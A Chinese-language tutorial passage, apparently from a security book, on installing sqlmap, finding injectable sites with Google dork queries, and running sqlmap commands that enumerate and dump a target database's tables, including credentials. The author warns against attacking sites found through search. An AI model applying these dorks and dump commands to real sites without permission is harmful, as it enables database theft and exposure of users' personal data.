  trans: '


    `sqlmap` 的广泛兼容性足以让大多数勤奋的系统管理员感到担忧。根据其网站，`sqlmap` 支持以下数据库服务器：MySQL、Oracle、PostgreSQL、Microsoft
    SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB 和 HSQLDB。


    让我们来看看如何安装 `sqlmap`。它包含在像 Kali Linux 某些基于安全性的发行版中，但如果你的包管理器仓库中没有它，还有其他安装方法。


    你可以使用 Git 的 `clone` 命令来使用 GitHub 上的 `sqlmap` 仓库：


    ```

    # git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

    ```


    你也可以从 [`https://github.com/sqlmapproject/sqlmap/zipball/master`](https://github.com/sqlmapproject/sqlmap/zipball/master)
    获取一个 Zip 文件。


    你也可以从 [`https://github.com/sqlmapproject/sqlmap/tarball/master`](https://github.com/sqlmapproject/sqlmap/tarball/master)
    下载 tarball 包。


    一旦你遵循了安装说明，你应该能够进入可以运行以下命令的阶段（在运行之前的 Git 命令后，你只需要执行此即可开始）：


    ```

    # cd sqlmap-dev

    # python ./sqlmap.py -h

    ```


    此命令将为你提供选项列表。


    ## 启动攻击


    现在让我们来看 `sqlmap` 功能的核心，即入侵远程机器。


    但请注意，测试你的 `sqlmap` 技能的一个耗时方面可能涉及搭建自己的漏洞测试服务器，或者合法地识别易受攻击的网站。你可能会对此感到惊讶，因为 URL
    的形成方式，Google 可以很容易地识别出漏洞网站。不用多说，我不建议攻击通过 Google 或任何其他方法发现的任何网站。然而，为了发现可能被利用的 URL，你可以输入如
    `inurl:website.php?id=` 或 `inurl:product.php?id=` 之类的查询。第一个搜索词返回了令人担忧的 170 万条结果。


    通过 Google 极不专业地暴露其漏洞的网站和其他在线资源获得了一个绰号，“Googledorks”。有一个网站列出了其中一些；它值得快速看一眼，地址为
    [`www.hackersforcharity.org/ghdb/`](http://www.hackersforcharity.org/ghdb/)。列表包含了许多潜在的秘密登录页面、敏感目录以及提到用户名的文件。请负责任地使用这些信息。


    顺便说，你可以通过 Python 运行 `sqlmap`，这意味着你的机器上需要安装某种 Python 实现。


    在 图 10.1 中，你可以看到开发者渴望远离非法活动。此类强大的工具总是会被滥用。


    让我们继续。看接下来的示例，使用 `sqlmap` 命令所需的语法非常简单：


    ```

    # python sqlmap.py -u http://www.a-vulnerable-website.com/product.php?id=1111

    ```


    ![插展示了 sqlmap 启动时的样子](img/c10f001.jpg)


    **图 10.1** 启动 sqlmap 时的界面，包含免责声明


    如果你在使用低速连接或遇到远程数据库服务器响应缓慢的情况，可以向该命令添加 `--time-sec 10` 以引入更真实的超时设置。虽然有些违反直觉的是，这实际上可以加快整个过程。


    现在让我们有条理地执行几个简单命令。一旦你熟悉了使用 `sqlmap`，可以将它们全部链接起来。


    我的 `sqlmap` 示例命令包含了 `-u` 选项，这意味着声明了一个 URL。该命令将通过多种 SQL 注入测试检查末尾参数（`id=1111`）的漏洞。从那里开始，`sqlmap`
    通常可以检测 Web 服务器厂商和版本、远程操作系统以及正在使用的数据库服务器版本。


    如果你现在想学习该目标网站正在使用的数据库名称怎么办？你可以通过如下方式添加 `--dbs` 选项来实现：


    ```

    # python sqlmap.py -u "http://www.a-vulnerable-website.com/product.php?id=1111"
    --dbs

    ```


    获取了这些有用信息后，你的下一步是发现正在使用的表名。你可以按照如下方式操作，将你的数据库名称替换为 `<database-name>` 条目：


    ```

    # python sqlmap.py -u "http://www.a-vulnerable-website.com/product.php?id=1111"
    --tables -D <database-name>

    ```


    下一个逻辑步骤将是学习感兴趣的数据库表所使用的列。命令如下，再次将你的数据库名称替换为 `<database-name>` 条目，并将 `<table-name>`
    替换为你的表名：


    ```

    # python sqlmap.py -u "http://www.a-vulnerable-website.com/product.php?id=1111"
    --columns -D <database-name> -T <table-name>

    ```


    该过程的最后部分是从目标提取所有数据。这可能包括用户名和密码、个人客户信息。要转储数据库，如所示引入 `--dump` 选项：


    ```

    # python sqlmap.py -u "http://www.a-vulnerable-website.com/product.php?id=1111"
    --dump -D <database-name> -T <table-name>

    ```


    如果你只想提取特定的列，可以直接指定它们。一旦你知道了列名，只需使用诸如 `-C columnX, columnY` 的选项将其列出，并用逗号分隔。这样做之后，只需移除上一个示例中的
    `--columns` 选项即可。


    你的最后一个命令可能会产生类似下面的输出：


    ```

    +-------+----------------+----------+----------+------------+--------------+

    | id    | title          | color    | price    | category  | received-date|

    +-------+----------------+----------+----------+------------+--------------+

    | 1111  | bars of soap   | green    | 1.22     | toiletries | 11.11.22     |

    +-------+----------------+----------+----------+------------+--------------+

    ```


    '
